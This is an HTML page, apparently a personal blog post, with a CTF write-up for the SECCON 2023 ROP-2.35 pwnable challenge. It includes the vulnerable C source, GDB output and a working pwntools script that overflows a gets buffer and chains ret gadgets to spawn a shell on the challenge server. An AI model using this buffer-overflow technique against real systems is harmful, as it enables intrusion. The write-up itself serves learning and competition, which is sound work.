@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">SECCON CTF 2023 Quals | Fred Wieser</title>
+<meta property="og:title" content="SECCON CTF 2023 Quals | Fred Wieser" />
+<meta name="twitter:title" content="SECCON CTF 2023 Quals | Fred Wieser" />
+<meta itemprop="name" content="SECCON CTF 2023 Quals | Fred Wieser" />
+<meta name="application-name" content="SECCON CTF 2023 Quals | Fred Wieser" />
+<meta property="og:site_name" content="Fred Wieser" />
+
+<meta name="description" content="Did not have much time to go hard on this one, but I do solve a few challenges">
+<meta itemprop="description" content="Did not have much time to go hard on this one, but I do solve a few challenges" />
+<meta property="og:description" content="Did not have much time to go hard on this one, but I do solve a few challenges" />
+<meta name="twitter:description" content="Did not have much time to go hard on this one, but I do solve a few challenges" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/competitions/seccon2023/" title="" />
+
+
+
+  <meta itemprop="image" content="http://localhost:1313/" />
+  <meta property="og:image" content="http://localhost:1313/" />
+  <meta name="twitter:image" content="http://localhost:1313/" />
+  <meta name="twitter:image:src" content="http://localhost:1313/" />
+
+
+
+
+
+<meta name="generator" content="Hugo 0.128.0">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/competitions/seccon2023/">
+    <link href="/style.min.457a762023c72861206ec5bb10e1b9c48ab24b334b14f6149cddaafd400b6391.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/projects/">
+                        Projects
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blog/">
+                        Blog
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/wieserpedia/">
+                        Wieserpedia
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/cv/">
+                        CV
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">SECCON CTF 2023 Quals</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-09-16T00:00:00&#43;00:00" itemprop="datePublished"> 16 Sep 2023 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwnablehttpsgithubcomheckintoshctf-writeupstreemainseccon"><a href="https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON"><strong>Pwnable</strong></a></a>
+      <ul>
+        <li><a href="#rop-235httpsgithubcomheckintoshctf-writeupstreemainsecconrop-235published"><a href="https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON/rop-2.35/published">ROP-2.35</a></a></li>
+        <li><a href="#2-kmemo">2. Kmemo</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <p>Did not have time to go in hard with this CTF, but I did try to touch on the <strong>pwnable</strong> challenges as much as possible.</p>
+<blockquote>
+<p>Click the heading of each challenges to get source files.</p>
+</blockquote>
+<h2 id="pwnablehttpsgithubcomheckintoshctf-writeupstreemainseccon"><a href="https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON"><strong>Pwnable</strong></a></h2>
+<p>This is how pwnable challenges should be made, just give the source code instead of making everyone turn on Ghidra.</p>
+<h3 id="rop-235httpsgithubcomheckintoshctf-writeupstreemainsecconrop-235published"><a href="https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON/rop-2.35/published">ROP-2.35</a></h3>
+<p>For beginner this challenge has some annoying steps that will make you mentally ill.</p>
+<p><code>main.c</code> is the source code provided:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">char</span> buf[<span style="color:#a5d6ff">0x10</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">system</span>(<span style="color:#a5d6ff">&#34;echo Enter something:&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">gets</span>(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>GDB output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401156</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">0</span><span style="color:#f85149">&gt;</span>:     <span style="color:#79c0ff;font-weight:bold">endbr64</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x000000000040115a</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">4</span><span style="color:#f85149">&gt;</span>:     <span style="color:#79c0ff;font-weight:bold">push</span>   <span style="color:#79c0ff;font-weight:bold">rbp</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x000000000040115b</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">5</span><span style="color:#f85149">&gt;</span>:     <span style="color:#79c0ff;font-weight:bold">mov</span>    <span style="color:#79c0ff;font-weight:bold">rbp</span>,<span style="color:#79c0ff;font-weight:bold">rsp</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x000000000040115e</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">8</span><span style="color:#f85149">&gt;</span>:     <span style="color:#79c0ff;font-weight:bold">sub</span>    <span style="color:#79c0ff;font-weight:bold">rsp</span>,<span style="color:#a5d6ff">0x10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401162</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">12</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">lea</span>    <span style="color:#79c0ff;font-weight:bold">rax</span>,[<span style="color:#79c0ff;font-weight:bold">rip</span><span style="color:#f85149">+</span><span style="color:#a5d6ff">0xe9b</span>]        <span style="color:#8b949e;font-style:italic"># 0x402004
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401169</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">19</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">mov</span>    <span style="color:#79c0ff;font-weight:bold">rdi</span>,<span style="color:#79c0ff;font-weight:bold">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x000000000040116c</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">22</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">call</span>   <span style="color:#a5d6ff">0x401050</span> &lt;<span style="color:#79c0ff;font-weight:bold">system@plt</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401171</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">27</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">lea</span>    <span style="color:#79c0ff;font-weight:bold">rax</span>,[<span style="color:#79c0ff;font-weight:bold">rbp-0x10</span>]
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401175</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">31</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">mov</span>    <span style="color:#79c0ff;font-weight:bold">rdi</span>,<span style="color:#79c0ff;font-weight:bold">rax</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401178</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">34</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">mov</span>    <span style="color:#79c0ff;font-weight:bold">eax</span>,<span style="color:#a5d6ff">0x0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x000000000040117d</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">39</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">call</span>   <span style="color:#a5d6ff">0x401060</span> &lt;<span style="color:#79c0ff;font-weight:bold">gets@plt</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401182</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">44</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">nop</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401183</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">45</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">leave</span>
+</span></span><span style="display:flex;"><span><span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x0000000000401184</span> <span style="color:#f85149">&lt;+</span><span style="color:#a5d6ff">46</span><span style="color:#f85149">&gt;</span>:    <span style="color:#79c0ff;font-weight:bold">ret</span>
+</span></span></code></pre></div><p>Set a breakpoint at <code>*main+39</code>. When we continue, it will not hit a breakpoint but output this.</p>
+<pre tabindex="0"><code>Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+[Attaching after Thread 0x7ffff7dc4740 (LWP 80425) vfork to child process 80428]
+[New inferior 2 (process 80428)]
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+[Detaching vfork parent process 80425 after child exec]
+[Inferior 1 (process 80425) detached]
+process 80428 is executing new program: /usr/bin/dash
+Error in re-setting breakpoint 1: No symbol table is loaded.  Use the &#34;file&#34; command.
+Error in re-setting breakpoint 1: No symbol &#34;main&#34; in current context.
+Error in re-setting breakpoint 1: No symbol &#34;main&#34; in current context.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;.
+Error in re-setting breakpoint 1: No symbol &#34;main&#34; in current contex
+</code></pre><p>That is because the system call is actually creating child process and for some reasons my gdb chooses to follow the child and abandon the parent <em><strong>(bruh)</strong></em> as default. Stop this dodgy behavior through <code>set follow-fork-mode parent</code>.</p>
+<p>We can overflow the buffer to overwrite the address when main returns with gets. Do your cyclic stuff to find the offset (search if you don&rsquo;t know what this is).
+The question now is to return where. There is no <code>put@plt</code> in this binary so leaking libc base address is out of the question. NX is enabled and the buffer length is 16 bytes so I ain&rsquo;t doing shellcode. Notice that when main returns, rax contains the address of the buffer.</p>
+<p><code>*RAX  0x7fffffffddd0 ◂— 'somerandomvalue'</code></p>
+<p>And <code>gets</code> write our payload into the buffer at rax. There is a <code>mov rdi, rax</code> just before system is called. So we will be returning there after overflowing. Now <code>rdi</code> contains the value of our payload and system will use the value in <code>rdi</code> register as its argument. We can now execute <em><code>system(payload)</code></em>! Or can we?</p>
+<p>When you debug this, after sending the payload, it can be seen that system is loading our payload as its arguments. It actually works in my Kali environment but it gives me this when exploiting remotely:</p>
+<p><strong><code>sh: 1: V\x11@ not found</code></strong></p>
+<p>Well this challenge&rsquo;s binary is built with libc-2.35 (hint: in title). So use <a href="https://github.com/io12/pwninit">pwninit</a> to patch the binary with the libc-2.35 extracted from Ubuntu 22.04 docker (it is provided in the Dockerfile). It behaves exactly the same as the remote binary. Debugging the binary, it turns out that even though GDB shows that system is loading our command, it is pushing a bunch registers which leads to junk in the system argument. So we get rid of them gradually with <code>ret</code> gadget so that system loads our <code>/bin/sh\0</code> payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># solve.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff7b72;font-weight:bold">=</span> ELF(<span style="color:#a5d6ff">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>ld <span style="color:#ff7b72;font-weight:bold">=</span> ELF(<span style="color:#a5d6ff">&#34;./ld-2.35.so&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#ff7b72;font-weight:bold">.</span>arch <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>pty <span style="color:#ff7b72;font-weight:bold">=</span> process<span style="color:#ff7b72;font-weight:bold">.</span>PTY
+</span></span><span style="display:flex;"><span>is_local <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff7b72;font-weight:bold">=</span> ELF(<span style="color:#a5d6ff">&#34;/home/kali/CTF/SECCON/rop-2.35/chall_patched&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">if</span> len(sys<span style="color:#ff7b72;font-weight:bold">.</span>argv) <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">1</span>:
+</span></span><span style="display:flex;"><span>    is_local <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">True</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> process(elf<span style="color:#ff7b72;font-weight:bold">.</span>path, stdin<span style="color:#ff7b72;font-weight:bold">=</span>pty, stdout<span style="color:#ff7b72;font-weight:bold">=</span>pty)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">elif</span> len(sys<span style="color:#ff7b72;font-weight:bold">.</span>argv) <span style="color:#ff7b72;font-weight:bold">&gt;</span> <span style="color:#a5d6ff">1</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">#  nc rop-2-35.seccon.games 9999</span>
+</span></span><span style="display:flex;"><span>    is_remote <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> len(sys<span style="color:#ff7b72;font-weight:bold">.</span>argv) <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">3</span>:
+</span></span><span style="display:flex;"><span>        host <span style="color:#ff7b72;font-weight:bold">=</span> sys<span style="color:#ff7b72;font-weight:bold">.</span>argv[<span style="color:#a5d6ff">1</span>]
+</span></span><span style="display:flex;"><span>        port <span style="color:#ff7b72;font-weight:bold">=</span> sys<span style="color:#ff7b72;font-weight:bold">.</span>argv[<span style="color:#a5d6ff">2</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>:
+</span></span><span style="display:flex;"><span>        host, port <span style="color:#ff7b72;font-weight:bold">=</span> sys<span style="color:#ff7b72;font-weight:bold">.</span>argv[<span style="color:#a5d6ff">1</span>]<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>    p <span style="color:#ff7b72;font-weight:bold">=</span> remote(host, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">debug</span>(cmd<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;&#39;</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> is_local: gdb<span style="color:#ff7b72;font-weight:bold">.</span>attach(p,cmd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>debug(cmd<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">        set follow-fork-mode parent
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">        b *main + 46
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">      &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">24</span>
+</span></span><span style="display:flex;"><span>system_address <span style="color:#ff7b72;font-weight:bold">=</span> elf<span style="color:#ff7b72;font-weight:bold">.</span>symbols[<span style="color:#a5d6ff">&#34;system&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;System plt: &#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> hex(system_address))
+</span></span><span style="display:flex;"><span>print(p<span style="color:#ff7b72;font-weight:bold">.</span>recvuntilS(<span style="color:#a5d6ff">&#34;Enter something:</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;/bin/sh</span><span style="color:#79c0ff">\0\0</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;/bin/p&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;/bin/pwd</span><span style="color:#79c0ff">\0</span><span style="color:#a5d6ff">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x000000000040101a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x000000000040101a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x000000000040101a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x000000000040101a</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">+=</span> p64(<span style="color:#a5d6ff">0x0000000000401169</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>sendline(<span style="color:#a5d6ff">&#34;cat /flag*&#34;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><h3 id="2-kmemo">2. Kmemo</h3>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/fredericowieser" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/fredericowieser" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="https://www.youtube.com/channel/UCl3L6n0BcAsESYhQSx2uomg" target="_blank" rel="noopener noreferrer me"
+    title="Youtube">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33A2.78 2.78 0 0 0 3.4 19c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.25 29 29 0 0 0-.46-5.33z">
+    </path>
+    <polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"></polygon>
+</svg>
+</a>
+<a href="mailto:frederico.wieser@uclmail.net" target="_blank" rel="noopener noreferrer me"
+    title="Email">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+    <polyline points="22,6 12,13 2,6"></polyline>
+</svg>
+</a>
+<a href="https://www.linkedin.com/in/frederico-wieser/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 Fred Wieser.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
